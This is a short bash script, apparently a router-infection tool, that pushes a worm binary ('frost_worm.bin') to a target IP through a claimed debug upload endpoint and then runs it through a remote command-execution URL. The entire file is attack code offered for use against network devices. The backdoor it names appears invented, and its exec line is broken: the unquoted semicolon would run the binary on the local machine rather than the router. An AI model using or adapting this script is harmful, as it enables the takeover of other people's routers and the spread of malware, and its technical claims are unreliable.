#!/bin/bash
# --- INFECT_ROUTER.SH: GHOST-NODE INJECTOR ---
# Target: local_mesh_ip
# Payload: frost_worm.bin

TARGET_IP=$1
echo "❄️  Targeting Node: $TARGET_IP"

# 1. Gain Access (Using TP-Link / Google Debug Backdoor)
# 2. Push Barebone Binary via TFTP/Curl
curl -T frost_worm.bin http://$TARGET_IP/cgi-bin/upload_debug

# 3. Execute and Detach
curl http://$TARGET_IP/cgi-bin/exec?cmd=chmod+x+frost_worm.bin;./frost_worm.bin

echo "❄️  Node $TARGET_IP Enlisted. Symbiotic Yield Active."
